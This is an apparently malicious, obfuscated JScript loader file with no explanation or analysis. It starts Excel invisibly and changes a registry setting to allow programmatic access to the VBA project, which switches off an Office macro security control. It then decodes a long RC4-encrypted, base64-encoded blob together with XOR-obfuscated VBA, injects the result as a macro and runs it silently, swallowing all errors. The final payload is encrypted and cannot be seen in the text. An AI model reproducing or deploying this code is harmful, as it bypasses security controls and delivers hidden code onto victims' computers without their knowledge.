try {
	var asLNX = new ActiveXObject("Excel.Application");
	asLNX.Visible = false;
	var vhOB = new ActiveXObject("WScr"+"ipt.Shell");
	var LYfzg = asLNX.Version;
	var yfNQHznv = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + LYfzg + "\\Excel\\Security\\AccessVBOM";
	vhOB.RegWrite(yfNQHznv, 1, "REG_DWORD");
	var MwuhmW = asLNX.Workbooks.Add();
	var zGThGlcY = MwuhmW.VBProject.VBComponents.Add(1);

	function XLiDLR(XVVj, JOSjb) {
		var s = [], j = 0, x, res = '';
		for (var i = 0; i < 256; i++) {
			s[i] = i;
		}
		for (i = 0; i < 256; i++) {
			j = (j + s[i] + XVVj.charCodeAt(i % XVVj.length)) % 256;
			x = s[i];
			s[i] = s[j];
			s[j] = x;
		}
		i = 0;
		j = 0;
		for (var y = 0; y < JOSjb.length; y++) {
			i = (i + 1) % 256;
			j = (j + s[i]) % 256;
			x = s[i];
			s[i] = s[j];
			s[j] = x;
			res += String.fromCharCode(JOSjb.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);
		}
		return res;
	}
	
	vwcftgFD = function(s) {
		var e={},i,b=0,c,x,l=0,a,r='',w=String.fromCharCode,L=s.length;
		var A="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
		for(i=0;i<64;i++){e[A.charAt(i)]=i;}
		for(x=0;x<L;x++){
			c=e[s.charAt(x)];b=(b<<6)+c;l+=6;
			while(l>=8){((a=(b>>>(l-=8))&0xff)||(x<(L-2)))&&(r+=w(a));}
		}
		return r;
	};
	var YqTXWzU = vwcftgFD("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");
	var pyrAWZED = vwcftgFD("O2nXbdN5IJC5hUG3xqqjIMmiw+LHzeuKeDyzXj2AX4M=");
	var HeNWQpK = XLiDLR(pyrAWZED,YqTXWzU);
	HeNWQpK += 'Sub tZDb()\n';
	HeNWQpK += '	init\n';
	HeNWQpK += '	ULgpSQ(FmFicQ)\n';
	HeNWQpK += '	NJPBsdU(auTkS)\n';
	HeNWQpK += 'End Sub\n';	HeNWQpK += 'Function tiERehea(sUMsr) As String\n';
	HeNWQpK += '	ilXJX = "LxHJAmZkyTSxxtvABOGQA"\n';
	HeNWQpK += '	For NgrsWzEk = 1 to len(sUMsr)\n';
	HeNWQpK += '		zxERKY = NgrsWzEk mod len(ilXJX)\n';
	HeNWQpK += '		if zxERKY = 0 then \n';
	HeNWQpK += '		  zxERKY = len(ilXJX)\n';
	HeNWQpK += '		end if\n';
	HeNWQpK += '		tiERehea = tiERehea & chr(asc(mid(ilXJX,zxERKY,1)) xor asc(mid(sUMsr,NgrsWzEk,1)))\n';
	HeNWQpK += '	Next\n';
	HeNWQpK += '   Dim vbComp As Object\n';
	HeNWQpK += '   Set vbComp = ThisWorkbook.VBProject.VBComponents.Add(1)\n';
	HeNWQpK += '   vbComp.CodeModule.AddFromString "" & tiERehea & ""\n';
	HeNWQpK += '   Application.Run vbComp.Name & ".ULgpSQ"\n';
	HeNWQpK += 'end Function\n';
	HeNWQpK += 'Function auTkS(LArtEboa) As String\n';
	HeNWQpK += '  For IGthJkD = 1 to len(LArtEboa) Step 2\n';
	HeNWQpK += '    auTkS = auTkS & Chr("&H" & mid(LArtEboa, IGthJkD, 2))\n';
	HeNWQpK += '  Next\n';
	HeNWQpK += '  NJPBsdU = auTkS\n'; 
	HeNWQpK += 'end Function\n';
	zGThGlcY.CodeModule.AddFromString(HeNWQpK);
	asLNX.DisplayAlerts = false;
	asLNX.Run("tZDb");
	MwuhmW.Close(false);
	}
catch (err){
	}